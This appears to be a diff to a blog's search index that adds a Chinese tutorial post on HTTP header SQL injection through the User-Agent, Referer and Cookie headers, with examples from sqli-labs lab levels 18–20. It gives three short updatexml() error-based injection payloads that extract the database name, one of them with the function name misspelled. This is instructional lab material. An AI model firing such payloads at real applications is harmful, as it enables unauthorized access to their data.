@@ -1,6 +1,43 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>HTTP头部注入</title>
+    <url>/2019/10/19/HTTP%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>HTTP基础：</p>
+<pre><code>Accept:浏览器能够处理的内容类型
+Accept-Charset:浏览器能够显示的字符集
+Accept-Encoding:浏览器能够处理的压缩编码
+Accept-Language:浏览器当前设置的语言
+Connection:浏览器与服务器之间的连接类型
+cookie：当前页面设置的任何cookie
+Host： 发出请求的页面所在的域
+Referer:发出请求的页面的URL
+User-Agent:浏览器的用户代理字符串
+Server:WEB服务器表明自己是什么软件及版本信息。例如：server Apache/2.0.61(Unix)
+</code></pre><p>​        <strong>HTTP头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤，从而产生的注入。 HTTP头注入常发生在程序采集用户信息的模块中。例如：</strong></p>
+<pre><code>1、X-Forwarded-For/client-IP
+2、User-Agent
+3、Referer
+4、Cookie</code></pre><p>​        <strong>cookie注入：COOKIE型注入是通过COOKIE进行数据提交的，其常见的情况有验证登陆、$_REQUEST获取参数。验证登陆是将用户的登陆信息放入COOKIE中来做权限验证的一种方法。</strong></p>
+<h2 id="User-Agent头注入"><a href="#User-Agent头注入" class="headerlink" title="User-Agent头注入"></a>User-Agent头注入</h2><p>​    <strong>与注册登录再注入类似，在登陆后insert语句带入查询，产生注入。构造的payload可以基于多种注入，下面以updatexml()报错为例</strong></p>
+<p><em>sqlilabs靶场第18关</em></p>
+<pre><code>&#39; and updatexnl(1,concat(0x23,database(),0x23),1) and &#39;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571472840.05.png" alt=""></p>
+<h2 id="Referer头注入"><a href="#Referer头注入" class="headerlink" title="Referer头注入"></a>Referer头注入</h2><p><strong>与UA头注入类似</strong></p>
+<p><em>sqlilabs靶场第19关</em></p>
+<pre><code>&#39; and updatexml(1,concat(0x23,database(),0x23),1) or &#39;#</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571473914846.png" alt="1571473914846"></p>
+<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p><em>sqlilabs靶场第20关</em></p>
+<pre><code>&#39; and updatexml(1,concat(0x23,database(),0x23),1)#</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571474297.68.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>web安全 - SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>数据库</tag>
+        <tag>HTTP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>POST注入</title>
     <url>/2019/10/19/POST%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p><strong>在登陆处用于判断账号、密码，在数据库中使用select语句；在修改密码处，更新密码会使用update语句；在购物系统中，订单的添加、删除会使用insert、delete语句</strong></p>
